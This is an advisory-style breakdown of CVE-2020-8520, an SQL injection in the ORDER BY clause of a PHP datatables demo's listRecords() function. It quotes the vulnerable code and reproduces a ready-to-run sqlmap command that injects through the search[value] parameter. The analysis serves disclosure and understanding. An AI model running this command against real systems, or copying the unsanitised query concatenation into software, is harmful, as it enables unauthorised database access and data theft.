Based on the provided content, here's a breakdown of the vulnerability:

**CVE-2020-8520**

*   **Root cause:** The application is vulnerable to SQL injection due to the lack of sanitization of the `order` and `column` parameters in the `listRecords()` function in `Records.php`. These parameters are directly incorporated into the SQL query's `ORDER BY` clause without any validation or escaping.
*   **Weaknesses/vulnerabilities present:**
    *   SQL Injection.
    *   Lack of input sanitization/validation on `$_POST['order']['0']['column']` and `$_POST['order']['0']['dir']`.
*   **Impact of exploitation:**
    *   An attacker can manipulate the SQL query, potentially leading to data exfiltration, modification, or denial of service.
*   **Attack vectors:**
    *   An attacker can craft a malicious POST request to `ajax_action.php` with a modified `order` parameter.
*   **Required attacker capabilities/position:**
    *   The attacker needs to be able to send HTTP POST requests to `ajax_action.php`.
    *   The attacker needs to understand the structure of the expected POST data for the `listRecords` action.

**Technical details from the provided content:**

The vulnerable code is located in the `listRecords()` function in the `Records.php` file:

```php
if(!empty($_POST["order"])){
    $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
} else {
    $sqlQuery .= 'ORDER BY id DESC ';
}
```

The `$sqlQuery` string is directly constructed by concatenating the unvalidated `$_POST['order']['0']['column']` and `$_POST['order']['0']['dir']` parameters.
This allows an attacker to inject arbitrary SQL code through these parameters.

The provided exploit code also shows how to exploit this vulnerability:

```
$ sqlmap -u "http://192.168.0.149/live-add-edit-delete-datatables-php-mysql-demo/ajax_action.php" --data "draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]="+and+"1&search[regex]=false&action=listRecords" -p "search[value]" --method POST --dbms=[mysql](http://www.php.net/mysql) --level 2 --risk 2
```

This `sqlmap` command shows an example of how the search parameter `search[value]` can be used to inject SQL, but the vulnerability we are addressing here is in the `order[0][column]` parameter.

The advisory from vapidlabs.com confirms this SQL injection vulnerability in the 'order' and 'column' parameters.

```
CVE-2020-8520 SQL Injection in line 29 with 'order' and 'column' parameter: 
 28 if(!empty($_POST["order"])){
 29   $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
 30 } else {
 31  $sqlQuery .= 'ORDER BY id DESC ';
 32 }
```